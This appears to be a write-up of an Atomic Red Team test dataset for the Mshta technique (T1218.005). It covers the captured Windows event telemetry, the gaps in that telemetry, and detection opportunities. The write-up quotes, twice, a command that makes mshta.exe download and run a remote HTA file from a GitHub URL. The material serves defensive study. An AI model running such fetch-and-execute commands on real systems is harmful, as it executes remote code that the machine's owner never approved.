# T1218.005-6: Mshta — Invoke HTML Application — Direct Download from URI

## Technique Context

T1218.005 (Mshta) involves abusing `mshta.exe`, the Microsoft HTML Application Host, to execute malicious code. This test directly passes a remote HTA file URI to `mshta.exe` for execution, eliminating the intermediate step of downloading the file separately. The `Invoke-ATHHTMLApplication` test framework function from AtomicTestHarnesses invokes `mshta.exe` with an `-HTAUri` parameter pointing to a raw GitHub URL:

```
Invoke-ATHHTMLApplication -HTAUri https://raw.githubusercontent.com/redcanaryco/atomic-red-team/24549e3866407c3080b95b6afebf78e8acd23352/atomics/T1218.005/src/T1218.005.hta -MSHTAFilePath $env:windir\system32\mshta.exe
```

This results in `mshta.exe` being called with the HTTPS URL as its argument, causing mshta.exe to download and execute the HTA content in a single step. The technique requires no intermediate file write — mshta.exe handles the download and execution internally, which reduces the filesystem artifact footprint compared to PowerShell-download variants.

## What This Dataset Contains

The dataset spans 4 seconds (2026-03-17T16:56:13Z to 16:56:17Z) across 151 total events: 108 PowerShell, 4 Security, 39 Sysmon.

**Full technique command in Security EID 4688 and Sysmon EID 1:** The child PowerShell process (PID 0x44a8 / 17576) spawned by the test framework (PID 0x3eac / 16044) carries the technique call in its command line, captured in both Security EID 4688 and Sysmon EID 1:

```
"powershell.exe" & {Invoke-ATHHTMLApplication -HTAUri https://raw.githubusercontent.com/redcanaryco/atomic-red-team/24549e3866407c3080b95b6afebf78e8acd23352/atomics/T1218.005/src/T1218.005.hta -MSHTAFilePath $env:windir\system32\mshta.exe}
```

The Sysmon EID 1 for this process carries the full command line with SHA1, MD5, SHA256, and IMPHASH hashes for the PowerShell binary. RuleName `technique_id=T1083,technique_name=File and Directory Discovery` fired from the sysmon-modular include rules.

**Sysmon EID 3 (Network connections, 2 total):** The dataset records 2 network connection events in its total of 39 Sysmon events. These fall outside the 20-event sample window, but their presence in the EID breakdown confirms that network connections were established — the `mshta.exe` (or the PowerShell invoking it) attempted to contact `raw.githubusercontent.com`.

**Process chain (Security EID 4688):** The test framework spawned two child PowerShell processes (PIDs 0x44a8 and 0x4560) and two whoami.exe validation processes (PIDs 0x3e0c and 0x4704) from the parent PowerShell (PID 0x3eac). This matches the standard test framework pattern.

**Named pipe creation (Sysmon EID 17, 3 events):** Three distinct PowerShell host sessions active during the test (test framework, technique invocation, cleanup).

**Cleanup PS block (EID 4104):** `Invoke-AtomicTest T1218.005 -TestNumbers 6 -Cleanup` confirms the test framework lifecycle completed.

## What This Dataset Does Not Contain

**No `mshta.exe` process creation event.** Despite the Sysmon EID breakdown showing 2 network connection events (which would originate from mshta.exe), no `mshta.exe` EID 1 or Security EID 4688 appears in the samples. The sysmon-modular config does include mshta.exe in its process create include rules. The mshta.exe process may have created and terminated before Sysmon logged it, or the process create event fell outside the 20-event sample window.

The 2 Sysmon EID 3 network events are outside the sample — their source process (likely mshta.exe) is therefore unconfirmed from the sample data alone.

Compared to the defended variant (35 Sysmon, 7 Security, 41 PowerShell events): the defended dataset also lacks mshta.exe process creation, and both have similar total event counts. This suggests either the test encountered a connectivity failure (GitHub was unreachable) or mshta.exe executed and terminated too quickly to be fully sampled.

## Assessment

This dataset's most forensically important artifact is the Security EID 4688 capturing the full `Invoke-ATHHTMLApplication` command with the `-HTAUri` GitHub URL. The full URL (including the specific commit hash `24549e3866407c3080b95b6afebf78e8acd23352`) is preserved verbatim in the process command line. The 2 network connection events in the total Sysmon count confirm that network activity occurred.

The undefended run is marginally richer than the defended run (39 vs. 35 Sysmon events, 108 vs. 41 PowerShell events), with the difference primarily in PowerShell script block volume. Neither run produced a clear mshta.exe process create in the sample set.

For detection purposes, the PowerShell command line containing the technique function and full URI is the most actionable artifact in this dataset — it captures the intent and target URL even without the downstream mshta.exe execution record.

## Detection Opportunities Present in This Data

**`Invoke-ATHHTMLApplication` with `-HTAUri` pointing to a GitHub raw URL in the PowerShell command line (Security EID 4688, Sysmon EID 1):** The Security EID 4688 process create for the child PowerShell records the full GitHub URL in the command line. While this is test framework-specific naming, the pattern of PowerShell command lines referencing `mshta.exe` with URI arguments is the underlying technique signature.

**`mshta.exe` invoked with an HTTPS URL as its argument (Security EID 4688, Sysmon EID 1 — when visible):** The technique's intended execution is `mshta.exe https://raw.githubusercontent.com/...`. Mshta.exe with an HTTP/HTTPS URL argument is rare in legitimate environments and is a documented indicator of this technique class.

**Network connection from `mshta.exe` to an external host (Sysmon EID 3):** When the 2 EID 3 events are examined, they would show `mshta.exe` establishing an outbound HTTPS connection to `raw.githubusercontent.com` (or equivalent hosting). Network connections from mshta.exe to any external host are inherently suspicious.

**`raw.githubusercontent.com` in process command line arguments:** The specific domain in the HTA URI is worth tracking independently of the process making the connection. PowerShell or any Windows binary receiving command-line arguments containing `raw.githubusercontent.com` paths should trigger review — particularly when combined with scripting language keywords or mshta invocations.
